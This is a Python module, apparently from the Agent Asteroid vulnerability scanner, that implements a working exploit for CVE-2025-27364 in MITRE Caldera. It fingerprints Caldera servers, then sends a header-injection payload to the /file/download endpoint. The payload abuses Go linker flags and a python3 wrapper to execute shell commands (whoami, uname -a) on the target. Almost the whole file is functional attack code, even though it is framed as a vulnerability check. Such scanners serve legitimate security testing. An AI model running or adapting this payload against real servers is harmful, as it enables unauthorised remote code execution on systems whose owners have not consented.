"""Agent Asteroid implementation for CVE-2025-27364"""

import re
import logging
import datetime
import requests

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "MITRE Caldera Agent Dynamic Compilation RCE"
VULNERABILITY_REFERENCE = "CVE-2025-27364"
VULNERABILITY_DESCRIPTION = """
All versions of MITRE Caldera (before commit 35bc06e) are vulnerable to remote code 
execution (RCE) through the dynamic compilation functionality of Sandcat and Manx agents.
The vulnerability can be triggered in default configurations as long as the server has
Go, Python, and GCC installed, which are standard requirements for Caldera operation.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)

CALDERA_PATTERN = r"\s*\|\s*CALDERA"
VULNERABLE_ENDPOINT = "/file/download"


def _generate_exploit_payload() -> str:
    """
    Generate the exploit payload for header injection.
    """
    return (
        "aaaa -buildmode plugin -extld gcc -extldflags "
        '\'-wrapper python3,-c,__import__("os").system("echo;echo;echo;echo${IFS}PWNED${IFS}by${IFS}CompSec${IFS}Direct.;echo;echo${IFS}I${IFS}AM:;whoami;echo${IFS}System${IFS}is:;uname${IFS}-a;echo;echo;echo")\''
    )


@exploits_registry.register
class CalderaAgentCompilationRCEExploit(webexploit.WebExploit):
    """
    CVE-2025-27364: MITRE Caldera Agent Dynamic Compilation RCE

    This exploit targets the dynamic compilation functionality in Caldera
    to achieve remote code execution by manipulating Go linker flags.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be a Caldera server.
        """
        try:
            response = self.session.get(
                f"{target.origin}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            # Look for indicators of Caldera in response
            return re.search(CALDERA_PATTERN, response.text, re.IGNORECASE) is not None
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempt to exploit the header injection vulnerability.
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        target_url = f"{target.origin.rstrip('/')}{VULNERABLE_ENDPOINT}"

        headers = {
            "file": "manx.go",
            "contact": _generate_exploit_payload(),
            "platform": "linux",
        }

        try:
            response = self.session.post(
                target_url,
                headers=headers,
                timeout=DEFAULT_TIMEOUT.seconds,
                verify=False,
            )

            # Target URL is vulnerable. The command is executed and the results will be shown in the server logs
            if response.status_code == 200:
                logging.info("Target URL is vulnerable: %s", target_url)
                vuln = self.create_vulnerability(target)
                vulnerabilities.append(vuln)
            else:
                logging.warning(
                    "Potential issue with %s. Verify if the version is vulnerable.",
                    target_url,
                )

        except requests.exceptions.RequestException as e:
            logging.error("Error during exploitation attempt: %s", e)

        return vulnerabilities
